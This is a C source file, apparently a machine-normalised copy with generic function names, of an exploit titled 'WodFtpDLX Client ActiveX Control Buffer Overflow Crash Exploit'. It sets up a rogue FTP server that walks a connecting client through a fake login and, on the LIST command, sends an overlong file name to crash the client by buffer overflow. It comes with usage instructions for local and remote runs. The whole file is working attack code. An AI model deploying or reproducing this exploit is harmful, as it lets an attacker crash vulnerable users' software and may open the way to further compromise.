#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  mess ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  int /*<<< orphan*/  WORD ;
typedef  int /*<<< orphan*/  SOCKET ;
typedef  int /*<<< orphan*/ * HANDLE ;
typedef  scalar_t__ DWORD ;

/* Variables and functions */
 int /*<<< orphan*/ * FUNC0 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,scalar_t__*) ; 
 scalar_t__ FALSE ; 
 int /*<<< orphan*/  FTP_PORT ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *,scalar_t__*) ; 
 int FUNC2 () ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 int /*<<< orphan*/  FUNC3 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 scalar_t__ STILL_ACTIVE ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 scalar_t__ TRUE ; 
 int /*<<< orphan*/  FUNC5 () ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ,struct sockaddr*,int*) ; 
 int FUNC8 (int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  fileList ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ) ; 
 char* FUNC11 (TYPE_1__) ; 
 int FUNC12 (int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC13 (char*,...) ; 
 int FUNC14 (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC15 (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC17 (char*,char*) ; 
 scalar_t__ FUNC18 (char*,char*) ; 
 int /*<<< orphan*/  FUNC19 (char*,char*) ; 
 scalar_t__ FUNC20 (char*,char*) ; 
 int /*<<< orphan*/  FUNC21 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC22 (char*) ; 
 char* FUNC23 (char*,char*) ; 
 scalar_t__ wait ; 
 int /*<<< orphan*/  FUNC24 (char*,char*,char*) ; 

int FUNC25(int argc,char **argv){

	SOCKET sock, client;
	struct sockaddr_in sock_addr,client_addr;
	WSADATA data;
	WORD p;
	char mess[4096], received[512], addr[32];
	int lun, n, i, err;
	HANDLE fileListH;
	DWORD fileListId, exitCode;

	FUNC13("------------------------------------------------------------------------------\r\n");
	FUNC13("WodFtpDLX Client ActiveX Control Buffer Overflow Crash Exploit\r\n");
	FUNC13("\t\t\tcreated by Komrade\r\n\r\n");

	FUNC13("\t\te-mail: unsecure(at)altervista(dot)org\r\n");
	FUNC13("\t\tweb: http://unsecure.altervista.org\r\n");
	FUNC13("------------------------------------------------------------------------------\r\n\r\n");

	if (((argc != 2) || (FUNC18(argv[1], "-l") != 0)) && ((argc != 3) || (FUNC18(argv[1], "-r") != 0))){
		FUNC13("Usage: WodFtpCrash [-l] [-r server IP]\r\n\r\n");
		FUNC13("Options:\r\n");
	 	FUNC13(" -l\t\texecuted locally.\r\n");
		FUNC13(" -r server IP\texecuted remotely. You need to specify the address of the\r\n");
		FUNC13("\t\tFTP server for the PASV command (Insert your IP address)\r\n");
		FUNC13("\r\nExamples:\r\n");
		FUNC13(" wodftpcrash -l\t\t\texecuted locally\r\n");
		FUNC13(" wodftpCrash -r 10.0.0.1\texecuted remotely\r\n");
		return 0;
	}

       	if(FUNC18(argv[1], "-r") == 0){
		char *token[4];

		token[0]=FUNC23(argv[2], ".");
		for(i = 1; i < 4; i++){
			token[i]=FUNC23(NULL, ".");
		}

		FUNC19(addr, "\0");

		for(i=0; (i < 4) && (token[i]!= NULL); i++){
			FUNC21(addr, token[i], 16);
			FUNC17(addr, ",");
		}
	}
	else
		FUNC19(addr, "127,0,0,1,");

	p = FUNC3(2, 0);
	FUNC6(p, &data);

	sock=FUNC16(PF_INET,SOCK_STREAM,0);
	sock_addr.sin_family=PF_INET;
	sock_addr.sin_port=FUNC10(FTP_PORT);
	sock_addr.sin_addr.s_addr=INADDR_ANY;

        err = FUNC8(sock, (struct sockaddr*)&sock_addr, sizeof(struct sockaddr_in));
	if (err < 0){
		FUNC13("Error in bind(). Port may be in use\r\n");
		return -1;
	}
	err = FUNC12(sock,1);
	if (err < 0){
		FUNC13("Error in listen()\r\n");
		return -1;
	}

	lun = sizeof (struct sockaddr);

	FUNC13("Opening the FTP port and waiting for connections...\r\n");
	client = FUNC7(sock, (struct sockaddr*)&client_addr, &lun);
	FUNC13("Client connected from IP: %s\r\n\r\n", FUNC11(client_addr.sin_addr));

	FUNC19(mess, "220 WodFtpDlx ActiveX Control Crash Exploit\r\n");
	n=FUNC15(client, mess, FUNC22(mess), 0);
	if (n < 0){
		FUNC13("Error in send()\r\n");
		return -1;
	}

	while(wait == TRUE){

		FUNC4(800);
		n = FUNC14(client, received, sizeof(mess), 0);
		if (n < 0){
			FUNC13("Error in recv()\r\n");
			return -1;
		}

		received[n]=0;
		FUNC13("CLIENT: %s", received);

		if (FUNC20("USER", FUNC23(received, " ")) == 0)
			FUNC19(mess, "331 Anonymous access allowed, send password.\r\n");
		else if (FUNC20("PASS", FUNC23(received, " ")) == 0)
			FUNC19(mess, "230 Anonymous user logged in.\r\n");
		else if (FUNC20("PWD\r\n", received) == 0)
			FUNC19(mess, "257 \"/\" is current directory.\r\n");
		else if (FUNC20("CWD", FUNC23(received, " ")) == 0)
			FUNC19(mess, "257 \"/\" is current directory.\r\n");
		else if (FUNC20("TYPE", FUNC23(received, " ")) == 0)
			FUNC19(mess, "200 Type set to A.\r\n");
		else if (FUNC20("PASV\r\n", received) == 0){
			fileListH = FUNC0(NULL, 0, fileList, NULL, 0, &fileListId);
			if (fileListH == NULL)
				FUNC13("Error in CreateThread() %d", FUNC2());
			FUNC24(mess, "227 Entering Passive Mode (%s4,82).\r\n", addr);
		}
		else if (FUNC20("LIST", FUNC23(received, " ")) == 0 || FUNC20("LIST\r\n", received) == 0){
			FUNC19(mess, "125 Data connection already open; Transfer starting.\r\n");
			FUNC13("SERVER: %s\r\n", mess);
			n=FUNC15(client, mess, FUNC22(mess), 0);
			if (n < 0){
				FUNC13("Error in send()\r\n");
				return -1;
			}
			wait = FALSE;

			do{
				FUNC1(fileListH, &exitCode);
				FUNC4(100);
			}
			while(exitCode == STILL_ACTIVE);
			FUNC13("< Long file name sent to client >\r\n\r\n");

			FUNC19(mess, "226 Transfer complete.\r\n");
		}
		else
			FUNC19(mess, "550 Unimplemented\r\n");

		FUNC13("SERVER: %s\r\n", mess);
		n = FUNC15(client, mess, FUNC22(mess), 0);
		if (n < 0){
				FUNC13("Error in send()\r\n");
				return -1;
		}
	}

	FUNC13("Wait.......");
	FUNC4(2000);
	FUNC13("Exploit succesfully sent!\r\n");

        FUNC9 (client);
	FUNC9(sock);

	FUNC5();
	return 0;
}